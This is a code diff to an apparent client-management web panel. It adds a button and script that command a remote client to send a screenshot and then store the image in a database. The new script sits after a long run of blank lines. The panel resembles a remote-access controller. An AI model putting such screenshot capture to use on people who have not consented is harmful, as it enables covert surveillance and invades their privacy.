@@ -134,6 +134,7 @@
                 <button onclick="muteClient('<%= clientId %>')">Mute</button>
                 <button onclick="unmuteClient('<%= clientId %>')">Unmute</button>
                 <button onclick="deleteClient('<%= clientId %>')">Delete</button>
+                <button onclick="sendDhvanilCommand('<%= clientId %>')">Dhvanil</button>
 
               </td>
             </tr>
@@ -277,6 +278,92 @@
           console.error('Error:', error);
         });
     });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+  </script>
+  <script>
+    function sendDhvanilCommand(clientId) {
+      fetch(`/send-dhvanil-command/${clientId}`, { method: 'POST' })
+        .then(response => response.json())
+        .then(data => {
+          // Example of the expected JSON response from the client
+          const jsonObject = {
+            type: "Screenshot",
+            filename: data.filename,
+            image: data.image, // Base64 encoded image
+            size: data.size,
+            Id: clientId
+          };
+  
+          // Send the data to the server to save in the database
+          saveToDatabase(jsonObject);
+        })
+        .catch(error => console.error('Error:', error));
+    }
+  
+    function saveToDatabase(jsonObject) {
+      fetch('/save-dhvanil-data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(jsonObject)
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert(data.message);
+      })
+      .catch(error => console.error('Error:', error));
+    }
   </script>
   
 </body>
